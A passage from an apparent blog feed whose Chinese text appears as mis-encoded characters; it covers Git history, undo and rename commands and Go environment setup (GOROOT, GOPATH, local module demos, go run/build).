ä½å°±å¯ä»¥äº†ï¼ŒGitä¼šè‡ªåŠ¨å»(å½“ç„¶ä¹Ÿä¸èƒ½åªå†™å‰ä¸€ä¸¤ä½ï¼Œå› ä¸º Gitå¯èƒ½ä¼šæ‰¾åˆ°å¤šä¸ªç‰ˆæœ¬å·ï¼Œå°±æ— æ³•ç¡®å®šæ˜¯å“ªä¸€ä¸ªäº†)</p></li><li><p><code>git log</code> :æŸ¥çœ‹æäº¤çš„å†å²è®°å½•ï¼Œä»¥ä¾¿ç¡®å®šå›é€€åˆ°å“ªä¸ªç‰ˆæœ¬</p><p>å’Œ SVN ä¸ä¸€æ ·ï¼ŒGit çš„ commit id ä¸æ˜¯ 1ï¼Œ2ï¼Œ3â€¦â€¦é€’å¢çš„æ•°å­—ï¼Œè€Œæ˜¯ä¸€ä¸ªSHA1 è®¡ç®—å‡ºæ¥çš„ä¸€ä¸ªéå¸¸å¤§çš„æ•°å­—ï¼Œç”¨åå…­è¿›åˆ¶è¡¨ç¤º.å› ä¸º Gitæ˜¯åˆ†å¸ƒå¼çš„ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼Œåé¢æˆ‘ä»¬è¿˜è¦ç ”ç©¶å¤šäººåœ¨åŒä¸€ä¸ªç‰ˆæœ¬åº“é‡Œå·¥ä½œ,é¿å…å†²çªã€‚</p><p>æ¯æäº¤ä¸€ä¸ªæ–°ç‰ˆæœ¬ï¼Œå®é™…ä¸Š Gitå°±ä¼šæŠŠå®ƒä»¬è‡ªåŠ¨ä¸²æˆä¸€æ¡æ—¶é—´çº¿ã€‚å¦‚æœä½¿ç”¨å¯è§†åŒ–å·¥å…·æŸ¥çœ‹ Gitå†å²ï¼Œå°±å¯ä»¥æ›´æ¸…æ¥šåœ°çœ‹åˆ°æäº¤å†å²çš„æ—¶é—´çº¿ï¼š</p><ol type="1"><li><p>æ¯ä¸ªç‰ˆæœ¬è¾“å‡ºä¸€è¡Œç®€æ´çš„ä¿¡æ¯ <code>git log</code>é»˜è®¤æ˜¯æŸ¥çœ‹å½“å‰åˆ†æ”¯ï¼Œæ˜¾ç¤ºä»æœ€è¿‘åˆ°æœ€è¿œçš„æäº¤æ—¥å¿—ã€‚</p></li><li><p>æ¯ä¸ªç‰ˆæœ¬è¾“å‡ºä¸€è¡Œç®€æ´çš„ä¿¡æ¯</p><p>å¦‚æœå«Œè¾“å‡ºä¿¡æ¯å¤ªå¤šï¼Œçœ‹å¾—çœ¼èŠ±ç¼­ä¹±çš„ï¼ŒåŠ ä¸Š<code>--oneline</code> ä¸º<code>--pretty=oneline --abbrev-commit</code> çš„ç¼©å†™</p></li><li><p>æŒ‡å®šè¾“å‡ºæœ€è¿‘çš„å‡ ä¸ª commit <code>-&lt;number&gt;</code> æˆ–<code>-n &lt;number&gt;</code></p></li><li><p><code>--all</code> æŸ¥çœ‹æ‰€æœ‰åˆ†æ”¯çš„ commit è®°å½•ã€‚</p></li><li><p><code>branch_name</code> æŒ‡å®šæŸ¥çœ‹æŸä¸ªåˆ†æ”¯ï¼Œç›´æ¥åŠ åˆ†æ”¯å ä¾‹å¦‚:<code>git log --oneline dev</code> æŸ¥çœ‹ dev åˆ†æ”¯çš„ commitå†å²ã€‚</p></li><li><p><code>--graph</code> Draw a text-based graphical representationof the commit history on the left hand side of the output.</p></li><li><p>gitk</p><p>é€šè¿‡ git è‡ªå¸¦çš„å›¾å½¢åŒ–å·¥å…·æŸ¥çœ‹ç‰ˆæœ¬å†å²ã€‚ ä½¿ç”¨:åœ¨ä»“åº“è·¯å¾„çš„ç»ˆç«¯ä¸‹ï¼Œè¾“å…¥ <code>gitk</code></p></li></ol></li><li><p><code>git reflog</code> æŸ¥çœ‹ gitå‘½ä»¤å†å²ï¼Œä»¥ä¾¿ç¡®å®šè¦å›åˆ°ä¹‹å‰çš„é‚£ä¸ªç‰ˆæœ¬ã€‚å½“ä½ å›é€€åˆ°æ—§ç‰ˆæœ¬åï¼Œéœ€è¦çŸ¥é“æ–°ç‰ˆæœ¬çš„ commit_id æ‰èƒ½å›é€€åˆ°æ–°ç‰ˆæœ¬ã€‚</p><p>å¤§è‡´æœ‰ä¸¤ç§æ–¹å¼æŸ¥çœ‹æ–°ç‰ˆæœ¬ <code>commit_id</code></p><ol type="1"><li>å¦‚æœä½ æäº¤æ–°ç‰ˆæœ¬çš„å‘½ä»¤è¡Œç»“æœè¿˜åœ¨ï¼Œå³:<code>git commit xx -m "xx"</code> çš„ç»“æœä¼šè¿”å› æ–°ç‰ˆæœ¬<code>commit_id</code> åœ¨ä½ å›é€€åˆ°æ—§ç‰ˆæœ¬ä¹‹å‰ï¼Œ<code>git log</code> ä¹Ÿæœ‰<code>commit_id</code>ï¼Œ ä¸è¿‡ï¼Œå›é€€ä¹‹åå°±æ²¡äº†ã€‚</li><li><code>git reflog</code> æŸ¥çœ‹ gitå‘½ä»¤å†å²ï¼Œæœ‰ç§»åŠ¨æŒ‡é’ˆè®°å½•ä»¥åŠåœ¨æ¯è¡Œå¼€å¤´æœ‰æ¯æ¬¡çš„å½“å‰ç‰ˆæœ¬çš„ç‰ˆæœ¬å·(<code>commit_id</code>)</li></ol></li></ol><h2 id="ç®¡ç†ä¿®æ”¹">ç®¡ç†ä¿®æ”¹</h2><p>ä¸ºä»€ä¹ˆ Git æ¯”å…¶ä»–ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿè®¾è®¡å¾—ä¼˜ç§€ï¼Œå› ä¸º Gitè·Ÿè¸ªå¹¶ç®¡ç†çš„æ˜¯ä¿®æ”¹ï¼Œè€Œéæ–‡ä»¶ã€‚ä»€ä¹ˆæ˜¯ä¿®æ”¹ï¼Ÿæ¯”å¦‚ä½ æ–°å¢äº†ä¸€è¡Œï¼Œè¿™å°±æ˜¯ä¸€ä¸ªä¿®æ”¹ï¼Œåˆ é™¤äº†ä¸€è¡Œï¼Œä¹Ÿæ˜¯ä¸€ä¸ªä¿®æ”¹ï¼Œæ›´æ”¹äº†æŸäº›å­—ç¬¦ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªä¿®æ”¹ï¼Œåˆ äº†ä¸€äº›åˆåŠ äº†ä¸€äº›ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªä¿®æ”¹ï¼Œç”šè‡³åˆ›å»ºä¸€ä¸ªæ–°æ–‡ä»¶ï¼Œä¹Ÿç®—ä¸€ä¸ªä¿®æ”¹ã€‚</p><p>ç¬¬ä¸€æ¬¡ä¿®æ”¹ -&gt;<code>git add</code> -&gt; ç¬¬äºŒæ¬¡ä¿®æ”¹ -&gt;<code>git add</code> -&gt; <code>git commit</code> ç¬¬ä¸€æ¬¡ä¿®æ”¹ -&gt;ç¬¬äºŒæ¬¡ä¿®æ”¹ -&gt; <code>git add</code>-&gt; <code>git add</code> -&gt;<code>git commit</code></p><p>æ¯æ¬¡ä¿®æ”¹ï¼Œå¦‚æœä¸ç”¨ <code>git add</code> åˆ°æš‚å­˜åŒºï¼Œé‚£å°±ä¸ä¼šåŠ å…¥åˆ°commit ä¸­</p><p>å°ç»“ï¼š</p><p>åœºæ™¯1ï¼šå½“ä½ æ”¹ä¹±äº†å·¥ä½œåŒºæŸä¸ªæ–‡ä»¶çš„å†…å®¹ï¼Œæƒ³ç›´æ¥ä¸¢å¼ƒå·¥ä½œåŒºçš„ä¿®æ”¹æ—¶ï¼Œç”¨å‘½ä»¤<code>git restore &lt;filename&gt;</code>ã€‚</p><p>åœºæ™¯2ï¼šå½“ä½ ä¸ä½†æ”¹ä¹±äº†å·¥ä½œåŒºæŸä¸ªæ–‡ä»¶çš„å†…å®¹ï¼Œè¿˜æ·»åŠ åˆ°äº†æš‚å­˜åŒºæ—¶ï¼Œæƒ³ä¸¢å¼ƒä¿®æ”¹ï¼Œåˆ†ä¸¤æ­¥ï¼Œç¬¬ä¸€æ­¥ç”¨å‘½ä»¤<code>git restore --staged &lt;file&gt;</code>ï¼Œå°±å›åˆ°äº†åœºæ™¯1ï¼Œç¬¬äºŒæ­¥æŒ‰åœºæ™¯ 1 æ“ä½œã€‚</p><p>åœºæ™¯3ï¼šå·²ç»æäº¤äº†ä¸åˆé€‚çš„ä¿®æ”¹åˆ°ç‰ˆæœ¬åº“æ—¶ï¼Œæƒ³è¦æ’¤é”€æœ¬æ¬¡æäº¤ï¼Œå‚è€ƒç‰ˆæœ¬å›é€€ä¸€èŠ‚ï¼Œä¸è¿‡å‰ææ˜¯æ²¡æœ‰æ¨é€åˆ°è¿œç¨‹åº“ã€‚</p><h2 id="é‡å‘½åæ–‡ä»¶">é‡å‘½åæ–‡ä»¶</h2><p>æ–¹æ³•ä¸€:ï¼ˆæ¨èï¼‰ <code>git mv filename_old filename_new</code></p><p>æ–¹æ³•äºŒ:(ä¸æ¨èï¼Œä½†æ˜¯è¦æ˜¯ä¸å°å¿ƒè¯¯æ“ä½œäº†ï¼Œæˆ‘ä»¬è¦çŸ¥é“å¦‚ä½•å¤„ç†)è‹¥ä¸å°å¿ƒè¿›è¡Œäº†: <code>mv filename_old filename_new</code>,ç„¶åæƒ³å°†å˜æ›´æäº¤è‡³ stage æ—¶ï¼Œæœ‰ä»¥ä¸‹å‡ ç§æ“ä½œ: 1. ä½¿ç”¨<code>git add</code> çš„ <code>-A</code> é€‰é¡¹<code>git add -A filename_old filename_new</code> åœ¨å‰é¢æˆ‘ä»¬è®²äº†<code>git add -A</code> å¦‚æœä¸åŠ  <code>&lt;pathspec&gt;</code>åˆ™ä¼šå°†æ‰€æœ‰å˜æ›´(æ–°å¢æ–‡ä»¶ï¼Œä¿®æ”¹ï¼Œåˆ é™¤)éƒ½ä¼šæäº¤è‡³ stageã€‚è€Œå½“æˆ‘ä»¬æŒ‡å®š<code>&lt;pathspec&gt;</code>æ—¶ï¼Œå°±åªå°†å¯¹è¯¥æ–‡ä»¶(ä»¬)çš„æ‰€æœ‰å˜æ›´(æ–°å¢æ–‡ä»¶ï¼Œä¿®æ”¹ï¼Œåˆ é™¤)æäº¤è‡³ stageã€‚ 2.ä¸€æ­¥æ­¥æ¥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git add filename_new</span><br><span class="line">git rm filename_new</span><br></pre></td></tr></table></figure><p>å…ˆäº†è§£ä¸€ä¸‹ï¼Œ<code>git reset --hard</code> å‘½ä»¤ï¼Œæ–¹ä¾¿ä¸Šé¢åŠŸèƒ½çš„æµ‹è¯•ã€‚ä½œç”¨: å½»åº•å›é€€åˆ°æŸä¸ªç‰ˆæœ¬ï¼Œæœ¬åœ°çš„æºç (workingdirectoryã€stage)ä¹Ÿä¼šå˜ä¸ºä¸Šä¸€ä¸ªç‰ˆæœ¬çš„å†…å®¹ï¼Œæ­¤å‘½ä»¤æ…ç”¨ï¼</p><h2 id="åˆ é™¤æ–‡ä»¶">åˆ é™¤æ–‡ä»¶</h2><p>å½“ä½ è¦åˆ é™¤æ–‡ä»¶çš„æ—¶å€™ï¼Œå¯ä»¥é‡‡ç”¨å‘½ä»¤ï¼š<code>rm test.txt</code></p><p>è¿™ä¸ªæ—¶å€™ï¼ˆä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªæ—¶å€™åªæ‰§è¡Œäº† rm test.txtï¼‰æœ‰ä¸¤ç§æƒ…å†µ</p><p>ç¬¬ä¸€ç§æƒ…å†µ: çš„ç¡®è¦æŠŠ test.txt åˆ æ‰ï¼Œé‚£ä¹ˆå¯ä»¥æ‰§è¡Œ<code>git rm test.txt</code> <strong>åˆ é™¤æš‚å­˜åŒºçš„ä¿®æ”¹</strong>ï¼Œ<code>git commit -m "remove test.txt"</code>æäº¤åˆ°ä»“åº“ï¼Œç„¶åæ–‡ä»¶å°±è¢«å½»åº•åˆ é™¤äº†</p><p>ç¬¬äºŒç§æƒ…å†µ: åˆ é”™æ–‡ä»¶äº†ï¼Œä¸åº”è¯¥åˆ  test.txtï¼Œæ³¨æ„è¿™æ—¶åªæ‰§è¡Œäº†<code>rm test.txt</code>ï¼Œè¿˜æ²¡æœ‰æäº¤ï¼Œæ‰€ä»¥å¯ä»¥æ‰§è¡Œ<code>git restore test.txt</code> å°†æ–‡ä»¶æ¢å¤ã€‚</p><p>å¹¶ä¸æ˜¯è¯´æ‰§è¡Œå®Œ <code>git commit -m "remove test.txt"</code> åè¿˜èƒ½ç”¨<code>restore</code> æ¢å¤ï¼Œcommit ä¹‹åç‰ˆæœ¬åº“é‡Œçš„æ–‡ä»¶ä¹Ÿæ²¡äº†ï¼Œè‡ªç„¶æ²¡åŠæ³•ç”¨restore æ¢å¤ï¼Œè€Œæ˜¯è¦ç”¨å…¶ä»–çš„åŠæ³•</p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go é¡¹ç›®å†™ demo</title>
      <link href="/blog/2022/10/16/programming/go/go_demo/"/>
      <url>/blog/2022/10/16/programming/go/go_demo/</url>
      
        <content type="html"><![CDATA[<h1 id="go-é¡¹ç›®å†™-demo">Go é¡¹ç›®å†™ demo</h1><p>å¯¹ä¸€ä¸ªæœ¬åœ°çš„ Go åº“å†™ demo, åº”è¯¥å¦‚ä½•é…ç½®:</p><ol type="1"><li><p>æ–°å»ºä¸€ä¸ªç›®å½•,åŒ…å«åŒ…æ–‡ä»¶å¤¹</p></li><li><p>åœ¨ä¸åŒ…æ–‡ä»¶å¤¹ example åŒç›®å½•ä¸‹å»ºç«‹ <code>main.go</code>,ç„¶ååœ¨å…¶ä¸­å¯¼å…¥æ¨¡å—å <code>import ("example")</code></p></li><li><p>åœ¨å½“å‰ç›®å½•ä¸‹,</p><p><code>go mod init module_name</code> åˆå§‹åŒ– go.mod æ·»åŠ ä¸‹é¢è¯­å¥åˆ°go.mod,ä»è€Œå¯¼å…¥æœ¬åœ°çš„åŒ… example, replace æœ€åä¸ºç›¸å¯¹è·¯å¾„.</p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">require example v0.0.0</span><br><span class="line">replace example v0.0.0 =&gt; ./example</span><br></pre></td></tr></table></figure></p></li><li><p>æ‰§è¡Œ <code>go mod tidy</code>åˆ é™¤ä¸éœ€è¦çš„ä¾èµ–åŒ…ã€ä¸‹è½½æ–°çš„ä¾èµ–åŒ…ã€æ›´æ–° go.sum</p></li><li><p>è¿è¡Œ <code>main.go</code></p></li></ol><h2 id="å‚è€ƒ">å‚è€ƒ</h2><ol type="1"><li><p><a href="https://www.cnblogs.com/lxz123/p/15346689.html">missinggo.sum entry for module providing package <package_name> - å‡çº§æ‰“æ€ª -åšå®¢å›­</a></p></li><li><p><ahref="https://blog.csdn.net/ZXT149074136/article/details/121999432">buildé¡¹ç›®æ—¶å‡ºç°æŠ¥é”™--æœ¬åœ°å¼€å‘çš„åŒ…å¯¼å…¥ï¼š missing go.sum entry for moduleproviding package_å¥”è·‘çš„ Camille çš„åšå®¢-CSDN åšå®¢_c è¯­è¨€ buildæ—¶å‡ºé”™</a></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>GOROOTã€GOPATH ä»¥åŠ Go ç›¸å…³å‘½ä»¤</title>
      <link href="/blog/2022/10/16/programming/go/go_envs/"/>
      <url>/blog/2022/10/16/programming/go/go_envs/</url>
      
        <content type="html"><![CDATA[<p>æœ€è¿‘åœ¨é…ç½® VSCode çš„ Go æ’ä»¶æ—¶ï¼Œæ€»æ˜¯æŠ¥é”™æ‰¾ä¸åˆ°åŒ…ä¹‹ç±»çš„ï¼Œå‘ç°æ—¶ GOPATHå’Œ GOROOTåœ¨è¯¥ç¼–è¾‘å™¨ä¸­æ²¡æœ‰é…ç½®ï¼Œå€Ÿæ­¤äº†è§£ä¸€ä¸‹ä¸¤ä¸ªç¯å¢ƒå˜é‡ã€‚ç›®å‰ç¬”è€…ç”¨ç³»ç»Ÿæ˜¯ macOSBigSurï¼ŒGo ç‰ˆæœ¬ 1.16.6</p><h2 id="goroot">GOROOT</h2><p><code>$GOROOT</code>,ä¾¿æ˜¯ Go çš„å®‰è£…è·¯å¾„ï¼Œå­˜æ”¾ Goçš„å†…ç½®ç¨‹åºåº“ã€‚é€šå¸¸ä½ å®‰è£…å®Œåï¼Œä½ ç”µè„‘çš„ç¯å¢ƒå˜é‡å°±ä¼šè®¾å¥½ GOROOTè·¯å¾„ã€‚å½“ä½ å¼€å‘ Go ç¨‹åºçš„æ—¶å€™ï¼Œå½“ä½  importå†…ç½®ç¨‹åºåº“çš„æ—¶å€™ï¼Œå¹¶ä¸éœ€è¦é¢å¤–å®‰è£…ï¼Œè€Œå½“ç¨‹åºè¿è¡Œåï¼Œ é»˜è®¤ä¹Ÿä¼šå…ˆå» GOROOTè·¯å¾„ä¸‹å¯»æ‰¾ç›¸å¯¹åº”çš„åº“æ¥è¿è¡Œã€‚</p><p>é€šè¿‡ <code>go env</code> å¯ä»¥æŸ¥çœ‹æœ‰å…³ Goè¯­è¨€çš„ç›¸å…³ç¯å¢ƒå˜é‡è®¾å®šã€‚é€šå¸¸å¦‚æœä½ æ˜¯åˆæ¬¡å®‰è£…Goï¼Œå¹¶ä¸”æ²¡åšä»€ä¹ˆç¯å¢ƒå˜é‡è®¾å®šçš„è¯ï¼ŒGOROOT è®¾å®šè·¯å¾„å°±æ˜¯ä½ å½“åˆå®‰è£… Goè¯­è¨€çš„è·¯å¾„ï¼Œé€šå¸¸ç±»ä¼¼äº<code>/usr/local/go</code>ã€<code>/usr/local/Cellar/go/1.xx.x/libexec</code>ï¼Œä¸€èˆ¬ä¸ºå‰è€…åšè½¯è¿æ¥åˆ°åè€…ã€‚è€ŒGOPATH é€šå¸¸é»˜è®¤ä¼šæ˜¯ç”¨æˆ·ç›®å½•ä¸‹çš„ go æ–‡ä»¶å¤¹ï¼Œé€šå¸¸ç±»ä¼¼äº<code>$HOME/go</code>ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">realyee @ 192 <span class="keyword">in</span> /usr/local/Cellar/go/1.16.6/libexec</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">tree ./ -L 1</span></span><br><span class="line">./</span><br><span class="line">â”œâ”€â”€ CONTRIBUTING.md</span><br><span class="line">â”œâ”€â”€ CONTRIBUTORS</span><br><span class="line">â”œâ”€â”€ PATENTS</span><br><span class="line">â”œâ”€â”€ SECURITY.md</span><br><span class="line">â”œâ”€â”€ VERSION</span><br><span class="line">â”œâ”€â”€ api</span><br><span class="line">â”œâ”€â”€ bin</span><br><span class="line">â”œâ”€â”€ doc</span><br><span class="line">â”œâ”€â”€ favicon.ico</span><br><span class="line">â”œâ”€â”€ lib</span><br><span class="line">â”œâ”€â”€ misc</span><br><span class="line">â”œâ”€â”€ pkg</span><br><span class="line">â”œâ”€â”€ robots.txt</span><br><span class="line">â”œâ”€â”€ src</span><br><span class="line">â””â”€â”€ test</span><br><span class="line"></span><br><span class="line">8 directories, 7 files</span><br></pre></td></tr></table></figure><p>ä¸Šè¿°æ–‡ä»¶ï¼Œæœ‰ä¸‰ç‚¹å¯äº†è§£ï¼š bin ç›®å½•ï¼šæ‰§è¡Œæ–‡ä»¶ï¼šgoã€gofmtï¼Œç”šè‡³ godocdoc ç›®å½•ï¼šGo å„ä¸ªç‰ˆæœ¬çš„æ–‡æ¡£ src ç›®å½•ï¼šgo æ ‡å‡†åº“æºç </p><h2 id="gopath">GOPATH</h2><p>Go é‡‡ç”¨åŒ…ç®¡ç†ï¼Œæ²¡æœ‰é¡¹ç›®çš„æ¦‚å¿µã€‚Go å·¥ä½œåŒºæ˜¯ Goç®¡ç†æˆ‘ä»¬çš„æºæ–‡ä»¶ã€ç¼–è¯‘çš„äºŒè¿›åˆ¶æ–‡ä»¶å’Œç¼“å­˜å¯¹è±¡çš„åœ°æ–¹ï¼Œç¼“å­˜å¯¹è±¡ç”¨äºä»¥åæ›´å¿«çš„ç¼–è¯‘ã€‚è™½ç„¶ä¹Ÿå¯ä»¥æœ‰å¤šä¸ªå·¥ä½œåŒºï¼Œä½†é€šå¸¸å»ºè®®åªæœ‰ä¸€ä¸ªã€‚GOPATHä¾¿å……å½“å·¥ä½œåŒºçš„æ ¹æ–‡ä»¶å¤¹ã€‚</p><p>GOPATHï¼Œä¹Ÿå«å·¥ä½œåŒºç›®å½•ï¼ˆworkspace directoryï¼‰ï¼Œæ˜¯ Go ä»£ç æ‰€åœ¨çš„ç›®å½•ï¼ŒGo å¯»æ‰¾ Go å·¥ä½œåŒºçš„ä½ç½®ã€‚å¦‚æœæœªè®¾ç½®ç¯å¢ƒå˜é‡ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼ŒGo å‡å®šæˆ‘ä»¬çš„GOPATH ä½ç½®åœ¨ <code>$HOME/go</code>ï¼Œå…¶ä¸­ <code>$HOME</code>æ˜¯æˆ‘ä»¬è®¡ç®—æœºä¸Šç”¨æˆ·å¸æˆ·çš„æ ¹ç›®å½•ã€‚ æˆ‘ä»¬å¯ä»¥é€šè¿‡è®¾ç½® $GOPATHç¯å¢ƒå˜é‡æ¥æ”¹å˜å®ƒã€‚ å¦‚éœ€è¿›ä¸€æ­¥å­¦ä¹ ï¼Œè¯·æŒ‰ç…§æœ¬æ•™ç¨‹é˜…è¯»å’Œè®¾ç½® Linuxä¸­çš„ç¯å¢ƒå˜é‡ã€‚è¦æ£€æŸ¥è¿™ä¸€ç‚¹ï¼Œè¯·è¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼š<code>go env GOPATH</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">go <span class="built_in">env</span> GOPATH</span></span><br><span class="line">/Users/realyee/go</span><br></pre></td></tr></table></figure><p>ä¸€ä¸ª GOPATH å·¥ä½œåŒºï¼Œä¸€èˆ¬è¿™æ ·ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">./</span><br><span class="line">â”œâ”€â”€ bin</span><br><span class="line">â”œâ”€â”€ pkg</span><br><span class="line">â””â”€â”€ src</span><br><span class="line">    â”œâ”€â”€ hello_github</span><br><span class="line">    â””â”€â”€ hello_router.go</span><br></pre></td></tr></table></figure><ol type="1"><li>binï¼šä¿å­˜ç¼–è¯‘åç”Ÿæˆçš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚æˆ‘ä»¬çš„æ“ä½œç³»ç»Ÿä½¿ç”¨<code>$PATH</code>ç¯å¢ƒå˜é‡æ¥æŸ¥æ‰¾æ— éœ€å®Œæ•´è·¯å¾„å³å¯æ‰§è¡Œçš„äºŒè¿›åˆ¶åº”ç”¨ç¨‹åºï¼Œå»ºè®®å°†æ­¤ç›®å½•:<code>$GOPATH/bin</code>æ·»åŠ åˆ°æˆ‘ä»¬çš„å…¨å±€<code>$PATH</code> å˜é‡ä¸­ã€‚</li><li>pkgï¼šå®ƒä¿å­˜å·²å®‰è£…çš„åŒ…å¯¹è±¡ï¼ˆæ¯”å¦‚ï¼š.aï¼‰ã€‚æ¯ä¸ªç›®æ ‡æ“ä½œç³»ç»Ÿå’Œä½“ç³»ç»“æ„å¯¹éƒ½æœ‰è‡ªå·±çš„pkg å­ç›®å½•ã€‚ Go ç¼–è¯‘åŒ…æ—¶ç”Ÿæˆçš„ä¸­é—´æ–‡ä»¶ï¼Œç”¨æ¥ç¼“å­˜æé«˜ç¼–è¯‘æ•ˆç‡ã€‚</li><li>srcï¼šåŒ…å«æºä»£ç (æ¯”å¦‚ï¼š.go .c .h .s ç­‰)ã€‚ è¯¥è·¯å¾„å†³å®š importåŒ…æ—¶çš„å¯¼å…¥è·¯å¾„æˆ–å¯æ‰§è¡Œæ–‡ä»¶åç§°ã€‚ import åŒ…çš„æœç´¢é¡ºåºï¼š<ol type="1"><li>GOROOT/srcï¼šè¯¥ç›®å½•ä¿å­˜äº† Go æ ‡å‡†åº“ä»£ç ã€‚</li><li>GOPATH/srcï¼šè¯¥ç›®å½•ä¿å­˜äº†åº”ç”¨è‡ªèº«çš„ä»£ç å’Œç¬¬ä¸‰æ–¹ä¾èµ–çš„ä»£ç ã€‚</li></ol></li></ol><h2 id="goroot-å’Œ-gopath-é…ç½®">GOROOT å’Œ GOPATH é…ç½®</h2><ol type="1"><li><p>æŸ¥çœ‹äºŒè€…çš„ç¯å¢ƒå˜é‡ <code>go env</code> æŸ¥çœ‹ Go ç›¸å…³å…¨éƒ¨ç¯å¢ƒå˜é‡<code>go env å˜é‡å</code>ï¼Œå¦‚ï¼š<code>go env GOROOT</code>ã€<code>go env GOPATH</code>ç­‰</p></li><li><p>é…ç½® GOROOT ä¸€èˆ¬æƒ…å†µä¸‹ GOROOT æ— éœ€é…ç½®ï¼Œä½†æ˜¯å¦‚æœä½ çœ‹åˆ° GOROOTä¸ºç©ºï¼Œé‚£å¯ä»¥ï¼š</p><ol type="1"><li><code>which go</code> æŸ¥çœ‹ go çš„ä½ç½® <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ go env GOROOT</span><br><span class="line">/usr/local/Cellar/go/1.16.6/libexec</span><br><span class="line">(base)</span><br><span class="line"># realyee @ 192 in ~/go/src [15:40:34]</span><br><span class="line">$ which go</span><br><span class="line">/usr/local/bin/go</span><br><span class="line">(base)</span><br><span class="line"># realyee @ 192 in ~/go/src [15:41:41]</span><br><span class="line">$ ll /usr/local/bin/go</span><br><span class="line">lrwxr-xr-x  1 realyee  admin    26B Aug  8 21:08 /usr/local/bin/go -&gt; ../Cellar/go/1.16.6/bin/go</span><br></pre></td></tr></table></figure></li><li>è®¾ç½®ç¯å¢ƒå˜é‡ <code>export GOROOT=/usr/local/bin/go</code></li></ol></li><li><p>é…ç½® GOPATH</p><ol type="1"><li>åœ¨ç”µè„‘ä¸Šä»»æ„ä½ç½®åˆ›å»ºå·¥ä½œåŒºç›®å½•ï¼Œä¾‹å¦‚ï¼š<code>~/GO_PROJECTS</code></li><li>è®¾ç½®ç¯å¢ƒå˜é‡ <code>export GOPATH=~/GO_PROJECTS</code></li></ol></li></ol><h2 id="go-rungo-build-å’Œ-go-get">go runã€go build å’Œ go get</h2><h3 id="go-run">go run</h3><p>gorunï¼Œç®€å•ç†è§£å°±åƒæ˜¯è§£é‡Šçš„æ–¹å¼æ¥æ‰§è¡Œä»£ç ï¼Œè€Œåœ¨ç»†èŠ‚ä¸Šå®ƒå…¶å®ä¼šå°†ä»£ç è¿›è¡Œç¼–è¯‘ï¼Œæœ€åäº§ç”Ÿå¯æ‰§è¡Œæ–‡ä»¶ï¼Œç„¶åè¿è¡Œè¯¥å¯æ‰§è¡Œæ–‡ä»¶ï¼Œäº§ç”Ÿç¨‹åºæ‰§è¡Œåçš„ç»“æœï¼Œè€Œå¯æ‰§è¡Œæ–‡ä»¶ä¼šæ”¾åœ¨ç‰¹å®šçš„ä¸´æ—¶æ–‡ä»¶é‡Œé¢ï¼Œæ‰§è¡Œå®Œå°±ä¼šè‡ªåŠ¨åˆ é™¤äº†ã€‚é€šå¸¸å¼€å‘ä¸Šå°±æ˜¯ç”¨äºå‡è®¾åªæ˜¯è¦æµ‹è¯•ä¸€æ®µä»£ç ï¼Œé‚£å°±ä¼šç”¨ go run æ¥æ‰§è¡Œã€‚</p><h3 id="go-build">go build</h3><p><code>go build</code>ä»…ä»…ç¼–è¯‘ä»¥å¯¼å…¥è·¯å¾„å‘½åçš„åŒ…åŠå…¶ä¾èµ–é¡¹ï¼Œå°†å…¶æ”¾åˆ°æœ¬åœ°ã€‚é€šå¸¸åœ¨ $GOPATHç›®å½•ä¸‹æ‰§è¡Œ go buildï¼ŒGo ä¼šè‡ªåŠ¨å» srcä¸‹å¯»æ‰¾å¯¹åº”é¡¹ç›®ç›®å½•ï¼Œé»˜è®¤æ˜¯åœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶ã€‚</p><p>go build ç¼ºç‚¹ï¼šæ¯æ¬¡ç¼–è¯‘ä»£ç ï¼Œæ¯”è¾ƒæ²¡æœ‰æ•ˆç‡ï¼Œå½“é¡¹ç›®æ¶æ„è¶Šæ¥è¶Šå¤§ï¼Œbuildçš„é€Ÿåº¦ä¹Ÿå°±è¶Šæ¥è¶Šæ…¢ã€‚</p><h3 id="go-install">go install</h3><p>å› ä¸º go build çš„ç¼ºç‚¹ï¼Œå› æ­¤æœ‰ go install æŒ‡ä»¤ï¼Œgo 